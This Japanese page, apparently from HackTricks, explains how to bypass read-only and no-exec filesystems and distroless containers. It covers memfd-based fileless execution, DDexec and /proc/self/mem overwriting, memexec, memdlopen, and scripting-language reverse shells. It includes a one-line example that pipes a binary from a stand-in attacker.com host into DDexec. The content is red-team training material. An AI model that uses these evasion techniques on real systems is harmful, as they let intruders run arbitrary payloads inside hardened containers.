# FS保護のバイパス: 読み取り専用 / 実行不可 / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## 動画

以下の動画では、このページで言及されている技術がより詳しく説明されています：

- [**DEF CON 31 - Linuxメモリ操作の探索：ステルスと回避**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ngとメモリ内dlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

Linuxマシンが**読み取り専用 (ro) ファイルシステム保護**でマウントされていることがますます一般的になっています。特にコンテナでは、**`readOnlyRootFilesystem: true`**を`securitycontext`に設定するだけで、roファイルシステムでコンテナを実行することができます：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能であるため、ディスクに何も書き込めないというのは偽りです。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行することはできません**。

> [!WARNING]
> レッドチームの観点から見ると、これは**システムに既に存在しない**バイナリ（バックドアや`kubectl`のような列挙ツール）をダウンロードして実行することを**複雑にします**。

## 最も簡単なバイパス: スクリプト

バイナリについて言及しましたが、インタープリタがマシン内にある限り、**任意のスクリプトを実行することができます**。例えば、`sh`が存在する場合は**シェルスクリプト**、`python`がインストールされている場合は**Pythonスクリプト**です。

しかし、これはあなたのバイナリバックドアや他のバイナリツールを実行するには十分ではありません。

## メモリバイパス

バイナリを実行したいがファイルシステムがそれを許可していない場合、最良の方法は**メモリから実行すること**です。なぜなら、**保護はそこには適用されないからです**。

### FD + execシステムコールバイパス

マシン内に**Python**、**Perl**、または**Ruby**のような強力なスクリプトエンジンがある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタ（`create_memfd`システムコール）に保存することができます。これはこれらの保護によって保護されないため、**`exec`システムコール**を呼び出して**実行するファイルとしてfdを指定**します。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、**バイナリが圧縮され、b64エンコードされた**スクリプトを指定された言語で生成し、`create_memfd`システムコールを呼び出して作成された**fd**で**デコードおよび解凍する**手順と、実行するための**exec**システムコールを呼び出します。

> [!WARNING]
> これはPHPやNodeのような他のスクリプト言語では機能しません。なぜなら、スクリプトから生のシステムコールを呼び出す**デフォルトの方法がないからです**。したがって、バイナリを保存するための**メモリfd**を作成するために`create_memfd`を呼び出すことはできません。
>
> さらに、`/dev/shm`にファイルを持つ**通常のfd**を作成しても機能しません。なぜなら、**実行不可保護**が適用されるため、実行することは許可されないからです。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、プロセスの**`/proc/self/mem`**を上書きすることによって**自分のプロセスのメモリを変更する**技術です。

したがって、プロセスによって実行されているアセンブリコードを**制御することができ**、**シェルコード**を書き込み、プロセスを「変異」させて**任意のコードを実行する**ことができます。

> [!TIP]
> **DDexec / EverythingExec**を使用すると、**メモリ**から自分の**シェルコード**や**任意のバイナリ**を**ロードして実行**することができます。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec シェルコードのデーモン化** であり、異なるバイナリを **実行したいとき** に DDexec を再起動する必要はなく、DDexec テクニックを介して memexec シェルコードを実行し、その後 **このデーモンと通信して新しいバイナリを読み込んで実行する** ことができます。

**memexec を使用して PHP リバースシェルからバイナリを実行する方法の例** は [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) で見つけることができます。

### Memdlopen

DDexec と同様の目的を持つ [**memdlopen**](https://github.com/arget13/memdlopen) テクニックは、**メモリにバイナリを読み込む** より簡単な方法を提供します。依存関係を持つバイナリを読み込むことさえ可能です。

## Distroless Bypass

### What is distroless

Distroless コンテナは、特定のアプリケーションやサービスを実行するために必要な **最小限のコンポーネント** のみを含み、ライブラリやランタイム依存関係などを含みますが、パッケージマネージャー、シェル、システムユーティリティなどの大きなコンポーネントは除外されます。

Distroless コンテナの目的は、**不要なコンポーネントを排除することによってコンテナの攻撃面を減少させ**、悪用される可能性のある脆弱性の数を最小限に抑えることです。

### Reverse Shell

Distroless コンテナでは、通常のシェルを取得するための `sh` や `bash` を **見つけられない** かもしれません。また、`ls`、`whoami`、`id` などのバイナリも見つかりません... システムで通常実行するすべてのものです。

> [!WARNING]
> したがって、**リバースシェル** を取得したり、通常のように **システムを列挙** することは **できません**。

ただし、侵害されたコンテナが例えば Flask ウェブを実行している場合、Python がインストールされているため、**Python リバースシェル** を取得できます。Node を実行している場合は Node リバースシェルを取得でき、ほとんどの **スクリプト言語** でも同様です。

> [!TIP]
> スクリプト言語を使用することで、言語の機能を利用して **システムを列挙** することができます。

**read-only/no-exec** 保護が **ない** 場合、リバースシェルを悪用して **ファイルシステムにバイナリを書き込み**、それらを **実行** することができます。

> [!TIP]
> ただし、この種のコンテナでは通常これらの保護が存在しますが、**以前のメモリ実行テクニックを使用してそれらを回避する** ことができます。

**RCE 脆弱性を悪用してスクリプト言語のリバースシェルを取得し、メモリからバイナリを実行する方法の例** は [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) で見つけることができます。


{{#include ../../../banners/hacktricks-training.md}}
